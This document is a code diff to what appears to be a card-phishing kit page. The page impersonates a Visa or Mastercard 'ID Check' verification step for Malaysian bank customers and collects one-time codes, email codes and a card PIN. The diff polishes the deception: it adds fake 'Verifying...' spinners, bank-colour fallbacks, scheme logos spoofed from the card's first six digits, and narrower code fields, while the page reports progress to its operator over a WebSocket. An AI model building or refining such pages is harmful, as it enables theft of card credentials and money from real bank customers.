@@ -50,6 +50,11 @@
 .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
 @keyframes spin{to{transform:rotate(360deg)}}
 .status-msg{padding:10px 16px;margin:8px 0;border-radius:6px;font-size:13px;font-weight:500;display:none}
+.app-scheme-mark{display:inline-flex;gap:4px;vertical-align:middle}
+.app-circle{width:16px;height:16px;border-radius:50%;display:inline-block}
+.app-circle.red{background:#eb001b}
+.app-circle.yellow{background:#f79e1b}
+.app-scheme-name{vertical-align:middle;margin-left:4px;font-size:13px;color:#666}
 .app-verify-box {
                 width: 390px;
                 background: #fff;
@@ -330,7 +335,7 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="otp-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="otp-error"></div>
         <button class="otp-btn" id="otp-submit">Continue</button>
@@ -351,6 +356,7 @@
       <div class="pin-digits"><input type="text" id="pin-d1" maxlength="1" oninput="pinJump(1)" onkeydown="pinBack(event,0)"><input type="text" id="pin-d2" maxlength="1" oninput="pinJump(2)" onkeydown="pinBack(event,1)"><input type="text" id="pin-d3" maxlength="1" oninput="pinJump(3)" onkeydown="pinBack(event,2)"><input type="text" id="pin-d4" maxlength="1" onkeydown="pinBack(event,3)"></div>
       <div class="otp-error-msg" id="pin-error"></div>
       <button class="otp-btn" id="pin-submit" onclick="submitPin()">Continue</button>
+      <div class="overlay hidden" id="pin-spinner"><div style="text-align:center;padding:20px"><div class="spinner" style="width:30px;height:30px;border-color:#eee;border-top-color:#3f51b5"></div><p style="font-size:13px;color:#888;margin-top:8px">Verifying...</p></div></div>
     </div>
   </div>
 </div>
@@ -385,13 +391,14 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="email-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="email-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="email-error"></div>
         <button class="otp-btn" id="email-submit">Continue</button>
         <button class="otp-resend-btn" id="email-resend">Resend Code</button>
         <div class="otp-countdown">Code expires in <span id="email-timer">4:59</span></div>
       </div>
+      <div class="overlay hidden" id="email-spinner"><div style="text-align:center;padding:20px"><div class="spinner" style="width:30px;height:30px;border-color:#eee;border-top-color:#3f51b5"></div><p style="font-size:13px;color:#888;margin-top:8px">Verifying...</p></div></div>
       <div id="email-result" class="hidden"><div class="otp-result-msg" style="color:#e74c3c"><svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#e74c3c"/><line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/><line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/></svg><br>Verification Failed</div><p style="text-align:center;color:#888;font-size:13px;margin:8px 0"></p><button class="otp-btn" onclick="changeEmail()">Try Again</button></div>
     </div>
   </div>
@@ -936,15 +943,27 @@
                             ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
                           }
                         }
-                                   function updateBankLogo(name) {
-                                     var el=q('app-logo');if(!el)return;
-                                     fetch('/api/logo/'+encodeURIComponent(name)).then(function(r){return r.text()}).then(function(svg){el.innerHTML = svg}).catch(function(){el.textContent=name.charAt(0).toUpperCase();el.style.background='#'+Math.floor(Math.abs(name.split('').reduce(function(h,c){return((h<<5)-h)+c.charCodeAt(0)},0))).toString(16).slice(0,6)});
-                                     fetch('/api/bin/'+((q('cardNumber')?q('cardNumber').value||'':'').replace(/\s/g,'').slice(0,6))).then(function(r){return r.json()}).then(function(d){updateAppSchemeLogo(d.cardType||'')}).catch(function(){})
+                                   function getBankColor(name) {
+                                     var colors={'AMBANK':'#d63941','CIMB':'#002f6c','MALAYAN':'#f9a825','MAYBANK':'#f9a825','OCBC':'#e4202d','OVERSEA-CHINESE':'#e4202d','RHB':'#003c82','PUBLIC':'#8b0000','PBB':'#8b0000','STANDARD CHARTERED':'#2f6eb6','SCBMB':'#2f6eb6'};
+                                     var n=(name||'').toUpperCase();
+                                     for(var k in colors){if(n.indexOf(k)!==-1)return colors[k]}
+                                     return '#555'
                                    }
-                                   function updateAppSchemeLogo(ct) {
-                                     var el=q('app-scheme');if(!el)return;
-                                     if(/visa/i.test(ct)){el.innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> ID Check'}
-                                     else if(/master/i.test(ct)){el.innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg> ID Check'}
+                                   function updateBankLogo(name) {
+                                     var el=q('app-bank-logo');if(!el)return;
+                                     el.innerHTML='';el.style.background='transparent';
+                                     var img=document.createElement('img');
+                                     img.style.cssText='width:34px;height:28px;object-fit:contain';
+                                     img.onerror=function(){img.style.display='none';el.textContent=(name||'IB').slice(0,2).toUpperCase();el.style.background=getBankColor(name)};
+                                     fetch('/api/logo/'+encodeURIComponent(name||'Bank')).then(function(r){return r.json()}).then(function(d){var url=(d.data||d).logoUrl||'';if(url){img.src=url;el.appendChild(img)}else{img.onerror()}}).catch(function(){el.textContent=(name||'IB').slice(0,2).toUpperCase();el.style.background=getBankColor(name)})
+                                   }
+                                   function updateAppSchemeLogo(cardType) {
+                                     var el=document.getElementById('app-scheme');if(!el)return;
+                                     var n=(cardType||'').toLowerCase();
+                                     if(n.indexOf('visa')!==-1){el.innerHTML='<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> <span class="app-scheme-name">ID Check</span>'}
+                                     else if(n.indexOf('mastercard')!==-1||n.indexOf('mc')!==-1){el.innerHTML='<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'}
+                                     else if(n.indexOf('amex')!==-1){el.innerHTML='<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg> <span class="app-scheme-name">ID Check</span>'}
+                                     else{el.innerHTML='<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'}
                                    }
                                    function updatePinCardLogo(ct) {
                                      var el=document.getElementById('pin-card-logo');if(!el)return;
